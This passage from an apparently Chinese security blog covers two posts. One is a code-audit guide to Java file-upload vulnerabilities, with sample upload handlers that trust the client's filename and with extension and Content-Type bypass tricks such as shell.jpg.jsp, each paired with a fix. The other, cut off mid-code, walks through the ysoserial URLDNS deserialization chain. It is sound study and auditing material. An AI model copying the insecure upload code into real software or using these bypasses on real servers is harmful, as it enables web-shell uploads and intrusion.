string">"上传的文件名："</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    String filePath <span class="token operator">=</span> <span class="token string">"E:\\"</span><span class="token punctuation">;</span>    InputStream inputStream <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、ServletFileUpload"><a href="#2、ServletFileUpload" class="headerlink" title="2、ServletFileUpload"></a>2、ServletFileUpload</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>FileItem<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>FileUploadException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>ProgressListener<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>disk<span class="token punctuation">.</span>DiskFileItemFactory<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletFileUpload<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServlet<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>math<span class="token punctuation">.</span>BigDecimal<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>UUID<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//判断上传的文件是普通表单还是带文件的表单</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ServletFileUpload<span class="token punctuation">.</span><span class="token function">isMultipartContent</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//终止方法运行，说明这是一个普通表单 直接返回</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//创建上传文件的保存路径 建议在WEB-INF下 安全 用户无法直接访问上传的文件</span>        String uploadPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/upload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        File uploadFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>uploadPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>uploadFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//如果目录不存在 则创建目录</span>            uploadFile<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//缓存 临时文件</span>        <span class="token comment" spellcheck="true">// 临时路径 假如文件超过了预期的大小，我们就把他放入一个临时文件中，过几天自动删除，或者提醒用户转存为永久</span>        <span class="token comment" spellcheck="true">// 例如qq上传大文件 只会让你存放几天时间</span>        String tempPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/temp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        File tempFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>tempPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tempFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tempFile<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果不存在 创建</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//ServletFileupload负责处理上传的文件数据，并将表单中每个输入项封装成一个FileItem对象</span>        <span class="token comment" spellcheck="true">//在使用ServletFileUpload对象解析请求时 需要DiskFileItemFactory对象</span>        <span class="token comment" spellcheck="true">//所以我们需要 先构造 DiskFileItemFactory对象</span>        <span class="token comment" spellcheck="true">//再通过ServletFileupload对象的构造方法或setFileItemFactory()方法设置ServletFileUpload对象的fileItemFactory属性</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1.创建DiskFileItemFactory对象，处理文件上传路径或者大小限制</span>            DiskFileItemFactory factory <span class="token operator">=</span> <span class="token function">getDiskFileItemFactory</span><span class="token punctuation">(</span>uploadFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2.获取ServletFileUpload对象</span>            ServletFileUpload servletFileUpload <span class="token operator">=</span> <span class="token function">getServletFileUpload</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3.处理上传的文件</span>            String msg <span class="token operator">=</span> <span class="token function">uploadParseRequest</span><span class="token punctuation">(</span>servletFileUpload<span class="token punctuation">,</span> request<span class="token punctuation">,</span> uploadPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"result.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileUploadException</span> <span class="token operator">|</span> ServletException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> DiskFileItemFactory <span class="token function">getDiskFileItemFactory</span><span class="token punctuation">(</span>File file<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1.创建一个DiskFileItemFactory对象  用于处理文件上传路径及大小限制</span>        DiskFileItemFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DiskFileItemFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过工厂设置缓冲区 当上传的文件大于缓冲区时 把文件放置临时目录</span>        factory<span class="token punctuation">.</span><span class="token function">setSizeThreshold</span><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//缓冲区大小</span>        factory<span class="token punctuation">.</span><span class="token function">setRepository</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//临时文件的保存目录</span>        <span class="token keyword">return</span> factory<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> ServletFileUpload <span class="token function">getServletFileUpload</span><span class="token punctuation">(</span>DiskFileItemFactory factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//2.获取ServletFileUpload</span>        ServletFileUpload servletFileUpload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletFileUpload</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//上传进度</span>        servletFileUpload<span class="token punctuation">.</span><span class="token function">setProgressListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProgressListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">long</span> RreadSize<span class="token punctuation">,</span> <span class="token keyword">long</span> AllSize<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//      System.out.println("总大小："+AllSize+"kb\t已上传："+RreadSize+"kb");</span>                <span class="token comment" spellcheck="true">//      System.out.println("总大小："+AllSize+"kb\t已上传："+((int)(RreadSize*10000.0/AllSize))*1.0/100+"%");</span>                BigDecimal bd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>RreadSize <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">/</span> AllSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                bd <span class="token operator">=</span> bd<span class="token punctuation">.</span><span class="token function">setScale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> BigDecimal<span class="token punctuation">.</span>ROUND_HALF_UP<span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"总大小："</span> <span class="token operator">+</span> AllSize <span class="token operator">+</span> <span class="token string">"kb\t已上传："</span> <span class="token operator">+</span> bd <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//处理乱码</span>        servletFileUpload<span class="token punctuation">.</span><span class="token function">setHeaderEncoding</span><span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置单个文件的最大值</span>        servletFileUpload<span class="token punctuation">.</span><span class="token function">setFileSizeMax</span><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置总共能上传文件的大小 1024 = 1kb ->  1024*1024 = 1m -> 1m*10 = 10m</span>        servletFileUpload<span class="token punctuation">.</span><span class="token function">setSizeMax</span><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> servletFileUpload<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、文件流"><a href="#3、文件流" class="headerlink" title="3、文件流"></a>3、文件流</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">upload</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"file"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> CommonsMultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    String fileName <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"上传的文件名："</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    String filePath <span class="token operator">=</span> <span class="token string">"E:\\"</span><span class="token punctuation">;</span>    InputStream inputStream <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了以上三种上传方式，java中还有很多其他类似的文件上传方式，这里不一一举例了。</p><h2 id="0x03-审计技巧"><a href="#0x03-审计技巧" class="headerlink" title="0x03 审计技巧"></a>0x03 审计技巧</h2><p>当我们拿到一套源码时，主要通过以下几点来分析是否存在任意文件上传漏洞</p><ol><li> 程序是白名单还是黑名单校验后缀。</li><li> 是否校验文件上传的后缀，这里还有个细节需要提一下，程序员经常使用<code>suffix=fileName.substring(filename.indexOf(&quot;.&quot;))</code>来获取上传文件的后缀名，如果攻击者上传的文件名为shell.jpg.jsp。这个时候suffix为<code>.jpg.php</code>，这个时候肯定不在黑名单内，修复的方式也很简单，IndexOf()替换成 lastIndexOf()。</li><li>文件后缀对比， <code>string.equals(fileSuffix)</code>函数不区分大小写。这时可通过 string.Jsp 这种方式绕过。修复方案：在 比较之前使用 <code>fileSuffix.toLowerCase() </code>将前端取得的后缀名变换成小写或者改成 <code>s.equalsIgnoreCase(fileSuffix)</code> 即忽略大小 </li><li>系统是否通过文件类型来校验<code> String contentType = file.getContentType()</code>; 这种方式可以前端修改文件类型绕过上传 </li><li>java 程序中涉及到文件上传的函数，比如：<code>MultipartFile</code></li><li>模糊搜索相关文件上传类或者函数，比如</li></ol><pre><code>FileFileUploadFileUtilsUploadHandleServletFileLoadServletgetInputStreamFileOutputStreamDiskFileItemFactoryMultipartRequestEntity</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化之URLDNS链分析</title>
      <link href="/2022/10/12/java-fan-xu-lie-hua-zhi-urldns-lian-fen-xi/"/>
      <url>/2022/10/12/java-fan-xu-lie-hua-zhi-urldns-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>由于没有JDK版本限制，且只依赖于原生类，所以URLDNS链一般用于验证是否存在反序列化漏洞，它的利用效果主要是通过发送一次dns请求，如果收到请求，则说明存在漏洞。</p><h2 id="0x01-利用"><a href="#0x01-利用" class="headerlink" title="0x01 利用"></a>0x01 利用</h2><p>下载ysoserial并通过IDEA打开项目</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103214829896.png"></p><p>依赖配置好之后，我们打开<code>src/main/java/ysoserial/GeneratePayload.java</code>，点击主函数main旁边的小箭头来生成一个<code>ysoserial.GeneratePayload</code>的运行配置。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103230728646.png"></p><p>由于我们是要调试URLDNS的链，所以我们加上相应的参数即可</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221104005038067.png"></p><p>写一个反序列化的demo</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        SerializeUtil<span class="token punctuation">.</span><span class="token function">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">SerializeUtil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> objIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后可以发现dnslog收到解析请求，这就说明反序列化利用成功了。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103232750610.png"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>我们来分析下ysoserial的URLDNS链执行流程是怎么样的</p><p>前面我们说了，URLDNS链不需要依赖第三方包，且没有JDK版本限制，所以一般我们可以用来验证是否存在反序列化漏洞，打开<code>src/main/java/ysoserial/payloads/URLDNS.java</code>，在最上面的注释中，作者已经给出了调用链(Gadget chain)</p><pre><code>HashMap.readObject()    HashMap.putVal()        HashMap.hash()            URL.hashCode()</code></pre><p>我们来debug下看看它具体是怎么生成payload的。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103234510523.png"></p><p>在55行生成了一个HashMap的实例类，这是因为在HashMap类中重写了readObject</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reinitialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>loadFactor <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> Float<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal load factor: "</span> <span class="token operator">+</span>                                         loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span>    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Read and ignore number of buckets</span>    <span class="token keyword">int</span> mappings <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Read number of mappings (size)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal mappings count: "</span> <span class="token operator">+</span>                                         mappings<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// (if zero, use defaults)</span>        <span class="token comment" spellcheck="true">// Size the table using given load factor only if within</span>        <span class="token comment" spellcheck="true">// range of 0.25...4.0</span>        <span class="token keyword">float</span> lf <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0.25f</span><span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">float</span> fc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>mappings <span class="token operator">/</span> lf <span class="token operator">+</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fc <span class="token operator">&lt;</span> DEFAULT_INITIAL_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                   DEFAULT_INITIAL_CAPACITY <span class="token operator">:</span>                   <span class="token punctuation">(</span>fc <span class="token operator">>=</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                   MAXIMUM_CAPACITY <span class="token operator">:</span>                   <span class="token function">tableSizeFor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 